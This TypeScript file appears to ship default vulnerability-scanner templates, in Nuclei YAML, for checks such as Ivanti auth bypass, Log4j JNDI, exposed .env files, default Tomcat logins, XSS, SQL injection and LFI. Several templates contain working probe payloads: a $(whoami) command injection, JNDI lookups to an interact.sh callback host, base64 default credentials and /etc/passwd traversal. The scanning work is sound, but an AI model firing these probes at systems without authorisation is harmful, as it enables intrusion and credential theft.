import type { TemplateItem } from '../types';

export const DEFAULT_TEMPLATES: TemplateItem[] = [
  {
    id: 'cve-2023-46805-ivanti-auth-bypass',
    name: 'Ivanti Connect Secure - Authentication Bypass',
    severity: 'critical',
    protocol: 'http',
    tags: ['cve', 'cve2023', 'ivanti', 'auth-bypass', 'rce', 'kev'],
    cve_id: 'CVE-2023-46805',
    category: 'cves',
    author: 'projectdiscovery',
    description: 'An authentication bypass vulnerability in the web component of Ivanti ICS 9.x, 22.x allows remote attackers to access restricted resources without authentication.',
    yaml_content: `id: cve-2023-46805-ivanti-auth-bypass

info:
  name: Ivanti Connect Secure - Authentication Bypass
  author: projectdiscovery
  severity: critical
  description: Detects Ivanti Connect Secure / Policy Secure authentication bypass vulnerability.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2023-46805
  tags: cve,cve2023,ivanti,auth-bypass,kev

http:
  - method: GET
    path:
      - "{{BaseURL}}/api/v1/totp/user-backup-code/../../system/system-information"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - '"build"'
          - '"version"'
        condition: and
    extractors:
      - type: regex
        name: ivanti_version
        part: body
        regex:
          - '"version":\\s*"([^"]+)"'
        group: 1`,
  },
  {
    id: 'cve-2024-21887-ivanti-command-injection',
    name: 'Ivanti Connect Secure - Command Injection',
    severity: 'critical',
    protocol: 'http',
    tags: ['cve', 'cve2024', 'ivanti', 'rce', 'kev'],
    cve_id: 'CVE-2024-21887',
    category: 'cves',
    author: 'researcher',
    description: 'A command injection vulnerability in web components of Ivanti Connect Secure allows an authenticated administrator to send specially crafted requests and execute arbitrary commands.',
    yaml_content: `id: cve-2024-21887-ivanti-command-injection

info:
  name: Ivanti Connect Secure - Command Injection
  author: researcher
  severity: critical
  description: Detects command injection endpoint in Ivanti Connect Secure.
  tags: cve,cve2024,ivanti,rce

http:
  - method: GET
    path:
      - "{{BaseURL}}/api/v1/license/keys-status/$(whoami)"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "root"
          - "bin/bash"
        condition: or`,
  },
  {
    id: 'env-file-disclosure',
    name: 'Environment (.env) File Disclosure',
    severity: 'high',
    protocol: 'http',
    tags: ['exposure', 'config', 'sensitive', 'database', 'tokens'],
    category: 'exposures',
    author: 'geeknik',
    description: 'Detects publicly accessible .env configuration files containing database credentials, API secret keys, and application tokens.',
    yaml_content: `id: env-file-disclosure

info:
  name: Environment (.env) File Disclosure
  author: geeknik
  severity: high
  description: Publicly accessible .env configuration file found exposing critical secrets.
  tags: exposure,config,sensitive

http:
  - method: GET
    path:
      - "{{BaseURL}}/.env"
      - "{{BaseURL}}/.env.local"
      - "{{BaseURL}}/.env.production"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "DB_PASSWORD="
          - "APP_KEY="
          - "AWS_SECRET_ACCESS_KEY="
          - "DATABASE_URL="
        condition: or
    extractors:
      - type: regex
        name: db_host
        part: body
        regex:
          - 'DB_HOST=([^\r\n]+)'
        group: 1`,
  },
  {
    id: 'git-config-disclosure',
    name: 'Exposed .git/config Repository Metadata',
    severity: 'medium',
    protocol: 'http',
    tags: ['exposure', 'git', 'vcs', 'source-code'],
    category: 'exposures',
    author: 'ethicalhack3r',
    description: 'An exposed Git directory allows unauthorized users to download application source code and revision history.',
    yaml_content: `id: git-config-disclosure

info:
  name: Exposed .git/config Repository Metadata
  author: ethicalhack3r
  severity: medium
  description: Verifies presence of Git repository metadata directory.
  tags: exposure,git,vcs

http:
  - method: GET
    path:
      - "{{BaseURL}}/.git/config"
      - "{{BaseURL}}/.git/HEAD"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "[core]"
          - "repositoryformatversion"
          - "ref: refs/heads/"
        condition: or`,
  },
  {
    id: 'spring-boot-actuator-heapdump',
    name: 'Spring Boot Actuator - Heapdump Exposure',
    severity: 'high',
    protocol: 'http',
    tags: ['exposure', 'springboot', 'actuator', 'java', 'memory-dump'],
    category: 'exposures',
    author: 'dhiyaneshdk',
    description: 'Spring Boot Actuator heapdump endpoint allows attackers to download complete JVM memory dumps containing memory tokens, passwords, and sessions.',
    yaml_content: `id: spring-boot-actuator-heapdump

info:
  name: Spring Boot Actuator - Heapdump Exposure
  author: dhiyaneshdk
  severity: high
  description: Detects exposed Spring Boot actuator heapdump endpoint.
  tags: exposure,springboot,actuator

http:
  - method: GET
    path:
      - "{{BaseURL}}/actuator/heapdump"
      - "{{BaseURL}}/heapdump"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: header
        words:
          - "application/octet-stream"
          - "application/x-gzip"
        condition: or
      - type: binary
        part: body
        binary:
          - "4a4156412050524f46494c45" # JAVA PROFILE in hex`,
  },
  {
    id: 'cors-wildcard-origin-misconfig',
    name: 'CORS Arbitrary Origin Misconfiguration',
    severity: 'low',
    protocol: 'http',
    tags: ['misconfiguration', 'cors', 'generic'],
    category: 'misconfigurations',
    author: 'vuln-research',
    description: 'CORS Access-Control-Allow-Origin header reflects untrusted client origins allowing cross-domain data exfiltration.',
    yaml_content: `id: cors-wildcard-origin-misconfig

info:
  name: CORS Arbitrary Origin Misconfiguration
  author: vuln-research
  severity: low
  description: Verifies if application reflects arbitrary Origin header in CORS response.
  tags: misconfiguration,cors

http:
  - method: GET
    path:
      - "{{BaseURL}}/"
    headers:
      Origin: "https://evil-attacker.com"
    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - "Access-Control-Allow-Origin: https://evil-attacker.com"
          - "Access-Control-Allow-Credentials: true"
        condition: and`,
  },
  {
    id: 'graphql-introspection-enabled',
    name: 'GraphQL Introspection Query Enabled',
    severity: 'info',
    protocol: 'http',
    tags: ['exposure', 'graphql', 'api', 'schema'],
    category: 'exposures',
    author: 'dhiyaneshdk',
    description: 'GraphQL introspection is enabled, allowing attackers to query the complete backend API schema, queries, mutations, and types.',
    yaml_content: `id: graphql-introspection-enabled

info:
  name: GraphQL Introspection Query Enabled
  author: dhiyaneshdk
  severity: info
  description: Detects GraphQL endpoint with introspection enabled.
  tags: exposure,graphql,api

http:
  - method: POST
    path:
      - "{{BaseURL}}/graphql"
      - "{{BaseURL}}/api/graphql"
      - "{{BaseURL}}/v1/graphql"
    headers:
      Content-Type: "application/json"
    body: '{"query":"query { __schema { types { name } } }"}'
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "__schema"
          - "types"
        condition: and`,
  },
  {
    id: 'tomcat-manager-default-login',
    name: 'Apache Tomcat Manager - Default Login',
    severity: 'high',
    protocol: 'http',
    tags: ['default-login', 'tomcat', 'auth', 'java'],
    category: 'default-logins',
    author: 'c-frame',
    description: 'Detects Apache Tomcat Manager application configured with standard default credentials (tomcat:tomcat, admin:admin).',
    yaml_content: `id: tomcat-manager-default-login

info:
  name: Apache Tomcat Manager - Default Login
  author: c-frame
  severity: high
  description: Detects weak default credentials on Apache Tomcat administrative interface.
  tags: default-login,tomcat,auth

http:
  - method: GET
    path:
      - "{{BaseURL}}/manager/html"
    headers:
      Authorization: "Basic dG9tY2F0OnRvbWNhdA==" # tomcat:tomcat
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "Tomcat Web Application Manager"
          - "Server Status"
        condition: and`,
  },
  {
    id: 'swagger-ui-api-disclosure',
    name: 'Swagger / OpenAPI Documentation Disclosure',
    severity: 'info',
    protocol: 'http',
    tags: ['exposure', 'swagger', 'openapi', 'docs', 'api'],
    category: 'exposures',
    author: 'princechaddha',
    description: 'Publicly accessible Swagger UI / OpenAPI documentation exposes internal endpoints, parameter specifications, and data contracts.',
    yaml_content: `id: swagger-ui-api-disclosure

info:
  name: Swagger / OpenAPI Documentation Disclosure
  author: princechaddha
  severity: info
  description: Discloses Swagger interactive API documentation interface.
  tags: exposure,swagger,openapi,api

http:
  - method: GET
    path:
      - "{{BaseURL}}/swagger-ui.html"
      - "{{BaseURL}}/swagger/index.html"
      - "{{BaseURL}}/api-docs"
      - "{{BaseURL}}/v2/api-docs"
      - "{{BaseURL}}/openapi.json"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "swagger-ui"
          - '"swagger":'
          - '"openapi":'
        condition: or`,
  },
  {
    id: 'phpinfo-file-disclosure',
    name: 'PHPInfo Information Disclosure',
    severity: 'low',
    protocol: 'http',
    tags: ['exposure', 'php', 'phpinfo', 'config'],
    category: 'exposures',
    author: 'geeknik',
    description: 'Detects publicly accessible phpinfo() page disclosing PHP configuration, extensions, system paths, and environment variables.',
    yaml_content: `id: phpinfo-file-disclosure

info:
  name: PHPInfo Information Disclosure
  author: geeknik
  severity: low
  description: Detects PHP configuration dump via phpinfo().
  tags: exposure,php,phpinfo

http:
  - method: GET
    path:
      - "{{BaseURL}}/phpinfo.php"
      - "{{BaseURL}}/info.php"
      - "{{BaseURL}}/test.php"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "PHP Version"
          - "System"
          - "Configuration File (php.ini) Path"
        condition: and`,
  },
  {
    id: 'tech-detect-wordpress',
    name: 'WordPress Detection & Version Fingerprint',
    severity: 'info',
    protocol: 'http',
    tags: ['tech', 'wordpress', 'wp', 'detection', 'recon'],
    category: 'exposures',
    author: 'projectdiscovery',
    description: 'Fingerprints WordPress installation, active themes, and extracts generator version from meta tags.',
    yaml_content: `id: tech-detect-wordpress

info:
  name: WordPress Detection & Version Fingerprint
  author: projectdiscovery
  severity: info
  tags: tech,wordpress,detection

http:
  - method: GET
    path:
      - "{{BaseURL}}"
      - "{{BaseURL}}/wp-login.php"
    matchers-condition: or
    matchers:
      - type: word
        part: body
        words:
          - 'wp-content/themes'
          - 'wp-content/plugins'
          - 'name="generator" content="WordPress'
    extractors:
      - type: regex
        name: wp_version
        part: body
        regex:
          - 'content="WordPress\\s+([0-9.]+)'
        group: 1`,
  },
  {
    id: 'tech-detect-apache',
    name: 'Apache HTTP Server Fingerprint',
    severity: 'info',
    protocol: 'http',
    tags: ['tech', 'apache', 'detection', 'recon'],
    category: 'exposures',
    author: 'projectdiscovery',
    description: 'Detects Apache HTTP Server via Server response header and default error pages.',
    yaml_content: `id: tech-detect-apache

info:
  name: Apache HTTP Server Fingerprint
  author: projectdiscovery
  severity: info
  tags: tech,apache,detection

http:
  - method: GET
    path:
      - "{{BaseURL}}"
    matchers:
      - type: word
        part: header
        words:
          - "Server: Apache"
    extractors:
      - type: regex
        name: apache_version
        part: header
        regex:
          - "Server: Apache/([0-9.]+)"
        group: 1`,
  },
  {
    id: 'exposed-admin-panels',
    name: 'Exposed Admin Panels & Dashboards',
    severity: 'low',
    protocol: 'http',
    tags: ['panel', 'login', 'admin', 'exposure', 'recon'],
    category: 'exposures',
    author: 'projectdiscovery',
    description: 'Detects publicly exposed administrative login interfaces and control panels.',
    yaml_content: `id: exposed-admin-panels

info:
  name: Exposed Admin Panels & Dashboards
  author: projectdiscovery
  severity: low
  tags: panel,login,admin,exposure

http:
  - method: GET
    path:
      - "{{BaseURL}}/admin"
      - "{{BaseURL}}/admin/login"
      - "{{BaseURL}}/administrator"
      - "{{BaseURL}}/manager/html"
    matchers-condition: or
    matchers:
      - type: word
        part: body
        words:
          - "Admin Login"
          - "Dashboard"
          - "Sign In"
          - "Tomcat Web Application Manager"`,
  },
  {
    id: 'git-config-exposure',
    name: '.git/config Repository Exposure',
    severity: 'high',
    protocol: 'http',
    tags: ['exposure', 'git', 'config', 'recon'],
    category: 'exposures',
    author: 'projectdiscovery',
    description: 'Publicly accessible .git/config file exposing remote repositories, developer credentials, and branch history.',
    yaml_content: `id: git-config-exposure

info:
  name: .git/config Repository Exposure
  author: projectdiscovery
  severity: high
  tags: exposure,git,config

http:
  - method: GET
    path:
      - "{{BaseURL}}/.git/config"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "[core]"
          - "repositoryformatversion"
        condition: and`,
  },
  {
    id: 'env-file-disclosure',
    name: '.env Environment Secrets Disclosure',
    severity: 'critical',
    protocol: 'http',
    tags: ['exposure', 'env', 'token', 'credentials', 'cloud'],
    category: 'exposures',
    author: 'projectdiscovery',
    description: 'Direct disclosure of .env file containing database passwords, API keys, and application secrets.',
    yaml_content: `id: env-file-disclosure

info:
  name: .env Environment Secrets Disclosure
  author: projectdiscovery
  severity: critical
  tags: exposure,env,token,credentials

http:
  - method: GET
    path:
      - "{{BaseURL}}/.env"
      - "{{BaseURL}}/.env.local"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "DB_PASSWORD"
          - "APP_KEY="
          - "AWS_SECRET"
        condition: or`,
  },
  {
    id: 'apache-server-status',
    name: 'Apache mod_status Server Status Leak',
    severity: 'medium',
    protocol: 'http',
    tags: ['apache', 'status', 'exposure', 'misconfig'],
    category: 'misconfigurations',
    author: 'projectdiscovery',
    description: 'Publicly accessible server-status page exposing active client IP addresses and requested URLs.',
    yaml_content: `id: apache-server-status

info:
  name: Apache mod_status Server Status Leak
  author: projectdiscovery
  severity: medium
  tags: apache,status,exposure

http:
  - method: GET
    path:
      - "{{BaseURL}}/server-status"
      - "{{BaseURL}}/server-status?auto"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "Apache Server Status"
          - "Current Time:"
        condition: and`,
  },
  {
    id: 'spring-boot-actuator-env',
    name: 'Spring Boot Actuator Environment Leak',
    severity: 'high',
    protocol: 'http',
    tags: ['spring', 'actuator', 'spring-boot', 'exposure'],
    category: 'exposures',
    author: 'projectdiscovery',
    description: 'Unprotected Spring Boot Actuator env endpoint exposing system properties and server configurations.',
    yaml_content: `id: spring-boot-actuator-env

info:
  name: Spring Boot Actuator Environment Leak
  author: projectdiscovery
  severity: high
  tags: spring,actuator,spring-boot,exposure

http:
  - method: GET
    path:
      - "{{BaseURL}}/actuator/env"
      - "{{BaseURL}}/env"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "activeProfiles"
          - "propertySources"
        condition: and`,
  },
  {
    id: 'jenkins-unauth-access',
    name: 'Jenkins Unauthenticated Dashboard',
    severity: 'medium',
    protocol: 'http',
    tags: ['jenkins', 'ci-cd', 'exposure', 'panel'],
    category: 'exposures',
    author: 'projectdiscovery',
    description: 'Unauthenticated Jenkins dashboard allowing viewing of jobs, build artifacts, and configurations.',
    yaml_content: `id: jenkins-unauth-access

info:
  name: Jenkins Unauthenticated Dashboard
  author: projectdiscovery
  severity: medium
  tags: jenkins,ci-cd,exposure

http:
  - method: GET
    path:
      - "{{BaseURL}}/"
      - "{{BaseURL}}/login"
    matchers:
      - type: word
        part: header
        words:
          - "X-Jenkins:"`,
  },
  {
    id: 'laravel-debug-mode',
    name: 'Laravel Ignition Debug Mode RCE Check',
    severity: 'critical',
    protocol: 'http',
    tags: ['laravel', 'php', 'ignition', 'rce', 'cve'],
    cve_id: 'CVE-2021-3129',
    category: 'cves',
    author: 'projectdiscovery',
    description: 'Laravel Ignition debug mode exposed allowing remote code execution via deserialization.',
    yaml_content: `id: laravel-debug-mode

info:
  name: Laravel Ignition Debug Mode
  author: projectdiscovery
  severity: critical
  tags: laravel,php,ignition,cve

http:
  - method: POST
    path:
      - "{{BaseURL}}/_ignition/execute-solution"
    headers:
      Content-Type: "application/json"
    body: '{"solution": "Facade\\\\Ignition\\\\Solutions\\\\MakeViewVariableOptionalSolution", "parameters": {"variableName": "test", "viewFile": "test"}}'
    matchers:
      - type: word
        part: body
        words:
          - "The solution was executed successfully"
          - "viewFile"`,
  },
  {
    id: 'cve-2021-44228-log4j-rce',
    name: 'Apache Log4j JNDI Remote Code Execution',
    severity: 'critical',
    protocol: 'http',
    tags: ['cve', 'cve2021', 'apache', 'log4j', 'rce', 'kev'],
    cve_id: 'CVE-2021-44228',
    category: 'cves',
    author: 'projectdiscovery',
    description: 'Detects Apache Log4j JNDI lookup vulnerability via header injection.',
    yaml_content:
      'id: cve-2021-44228-log4j-rce\n\n' +
      'info:\n' +
      '  name: Apache Log4j JNDI RCE\n' +
      '  author: projectdiscovery\n' +
      '  severity: critical\n' +
      '  tags: cve,cve2021,apache,log4j,rce,kev\n\n' +
      'http:\n' +
      '  - method: GET\n' +
      '    path:\n' +
      '      - "{{BaseURL}}/"\n' +
      '    headers:\n' +
      '      X-Api-Version: "${jndi:ldap://{{BaseURL}}.interact.sh/test}"\n' +
      '      User-Agent: "${jndi:ldap://{{BaseURL}}.interact.sh/test}"\n' +
      '    matchers:\n' +
      '      - type: status\n' +
      '        status:\n' +
      '          - 200\n' +
      '          - 301\n' +
      '          - 302\n' +
      '          - 400',
  },
  {
    id: 'cve-2025-0282-ivanti-connect-secure-rce',
    name: 'Ivanti Connect Secure Stack Buffer Overflow RCE (2025)',
    severity: 'critical',
    protocol: 'http',
    tags: ['cve', 'cve2025', 'cve-2025', 'ivanti', 'rce', '2025'],
    cve_id: 'CVE-2025-0282',
    category: 'cves',
    author: 'projectdiscovery',
    description: 'A stack-based buffer overflow vulnerability in Ivanti Connect Secure allows remote code execution without authentication.',
    yaml_content: `id: cve-2025-0282-ivanti-connect-secure-rce

info:
  name: Ivanti Connect Secure Stack Overflow RCE (2025)
  author: projectdiscovery
  severity: critical
  tags: cve,cve2025,cve-2025,ivanti,rce,2025

http:
  - method: POST
    path:
      - "{{BaseURL}}/dana-ws/saml.cgi"
    body: "SAMLRequest=test"
    matchers:
      - type: status
        status:
          - 500
          - 200`,
  },
  {
    id: 'dast-xss-reflection',
    name: 'DAST Reflected XSS Parameter Probe',
    severity: 'high',
    protocol: 'http',
    tags: ['dast', 'fuzzing', 'xss', 'injection'],
    category: 'vulnerabilities',
    author: 'projectdiscovery',
    description: 'Active dynamic parameter fuzzing for reflected Cross-Site Scripting (XSS).',
    yaml_content: `id: dast-xss-reflection

info:
  name: DAST Reflected XSS Parameter Probe
  author: projectdiscovery
  severity: high
  tags: dast,fuzzing,xss

http:
  - method: GET
    path:
      - "{{BaseURL}}/?q=hx%22%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E"
      - "{{BaseURL}}/?search=hx%22%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E"
    matchers:
      - type: word
        part: body
        words:
          - '"><script>alert(1)</script>'`,
  },
  {
    id: 'dast-sql-error-injection',
    name: 'DAST SQL Error-Based Parameter Probe',
    severity: 'critical',
    protocol: 'http',
    tags: ['dast', 'fuzzing', 'sqli', 'injection'],
    category: 'vulnerabilities',
    author: 'projectdiscovery',
    description: 'Active parameter injection testing for database syntax errors indicative of SQL injection.',
    yaml_content: `id: dast-sql-error-injection

info:
  name: DAST SQL Error-Based Parameter Probe
  author: projectdiscovery
  severity: critical
  tags: dast,fuzzing,sqli

http:
  - method: GET
    path:
      - "{{BaseURL}}/?id=1%27%22"
      - "{{BaseURL}}/?user=admin%27--"
    matchers-condition: or
    matchers:
      - type: word
        part: body
        words:
          - "SQL syntax"
          - "mysql_fetch"
          - "ORA-01756"
          - "PostgreSQL query failed"
          - "SQLite/JDBCDriver"`,
  },
  {
    id: 'dast-lfi-traversal',
    name: 'DAST Local File Inclusion (LFI) Traversal',
    severity: 'high',
    protocol: 'http',
    tags: ['dast', 'fuzzing', 'lfi', 'traversal'],
    category: 'vulnerabilities',
    author: 'projectdiscovery',
    description: 'Fuzzes parameters with path traversal sequences to access sensitive system files like /etc/passwd.',
    yaml_content: `id: dast-lfi-traversal

info:
  name: DAST Local File Inclusion (LFI) Traversal
  author: projectdiscovery
  severity: high
  tags: dast,fuzzing,lfi

http:
  - method: GET
    path:
      - "{{BaseURL}}/?file=../../../../etc/passwd"
      - "{{BaseURL}}/?page=../../../../etc/passwd"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        part: body
        regex:
          - "root:.*:0:0:"`,
  },
  {
    id: 's3-bucket-public-listing',
    name: 'Public AWS S3 Bucket File Listing',
    severity: 'high',
    protocol: 'http',
    tags: ['cloud', 'aws', 's3', 'exposure', 'misconfig'],
    category: 'misconfigurations',
    author: 'projectdiscovery',
    description: 'Detects publicly readable and listable Amazon S3 cloud storage buckets.',
    yaml_content: `id: s3-bucket-public-listing

info:
  name: Public AWS S3 Bucket Listing
  author: projectdiscovery
  severity: high
  tags: cloud,aws,s3,exposure

http:
  - method: GET
    path:
      - "{{BaseURL}}"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "<ListBucketResult"
          - "<Contents>"
          - "<Key>"
        condition: and`,
  },
  {
    id: 'aws-secret-access-key-leak',
    name: 'AWS Access Key & Secret Token Disclosure',
    severity: 'critical',
    protocol: 'http',
    tags: ['token', 'aws', 'credentials', 'cloud', 'leak'],
    category: 'exposures',
    author: 'projectdiscovery',
    description: 'Scans response bodies and JS assets for exposed active AWS Access Key IDs (AKIA...).',
    yaml_content: `id: aws-secret-access-key-leak

info:
  name: AWS Access Key & Secret Token Disclosure
  author: projectdiscovery
  severity: critical
  tags: token,aws,credentials,cloud

http:
  - method: GET
    path:
      - "{{BaseURL}}"
      - "{{BaseURL}}/config.js"
      - "{{BaseURL}}/app.js"
    matchers:
      - type: regex
        part: body
        regex:
          - "(?:A3T[A-Z0-9]|AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}"`,
  },
];
